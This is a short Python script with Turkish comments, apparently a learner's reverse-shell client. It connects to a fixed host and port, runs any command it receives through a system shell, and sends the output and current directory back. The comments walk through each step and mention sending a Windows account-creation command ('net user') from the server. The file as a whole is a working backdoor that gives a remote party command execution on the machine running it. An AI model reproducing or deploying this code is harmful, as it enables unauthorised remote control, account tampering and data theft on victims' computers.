import socket
import os
import subprocess
s=socket.socket()

s.connect(("192.168.1.31",15555))

while True:
    veri=s.recv(1024)
    if veri[:2].decode("utf-8")=="cd":
        try:
            os.chdir(veri[3:].decode("utf-8"))
            s.send(os.getcwd().encode("utf-8"))           
        except FileNotFoundError:
            s.send("Dosya bulunamadı...".encode("utf-8"))
    else:

        if len(veri)>0:
            #eğer serverdan bir girdi varsa

            #serverdan girilen komutları komut sisteminde çalıştırabilmek için
            #subprocess adlı modülü çalıştırmak gerekiyor,bu modül sayesinde
            #hem serverdan girilen komutları komut sisteminde çalıştırabileceğiz
            #hemde çıktıyı servera yollayabileceğiz.
            #subprocess modülünün Popen() clasını kullanacağız
            cmd=subprocess.Popen(veri.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            #komut sisteminin arka planında çalışacak
            #2.parametre shell=True,komut sisteminde bu komutu çalıştırmaya izin verecek
            #stdout ve stderr ı okuyup server a yollamamız lazım
            output=cmd.stdout.read() + cmd.stderr.read()
            #output ı string e dönüştürelim
            output_str=str(output,encoding="cp857")  #####------------------------------------------------>>>>> utf-8 değil cp857 yapılacak nokta
            #her komutu çalıştırdıktan sonra karşı tarafa bulunduğumuz dizini yollamak istiyorum
            konum=os.getcwd() #string formatında olduğumuz dizini veriyor
            #Ben bu ikisini yani "output" ve "konum"  u birleştirip server a yollamak istiyorum
            #1. parametre toplanacak stringler  2.parametre hangi biçimde kodlayacağımızı belirtiyoruz
            s.send(str.encode(output_str+"\n"+konum,encoding="utf-8"))

            #komut a "net user nuri 12345" yazdın izin vermedi ve türkçe çıktı verdi bu utf8 ile kodlanmamıştır cp857 ile kodlanmıştır
            #net user nuri 12345 komutunu serverdan yazdıktan sonra benim client çöküyor UnicodeDecodeError hatası alıyoruz bunu
            #almamamız için cp857 yapmam gerekiyor
            
            
            
            
            
    
            
            
            
            

        
        
        
        
    
    
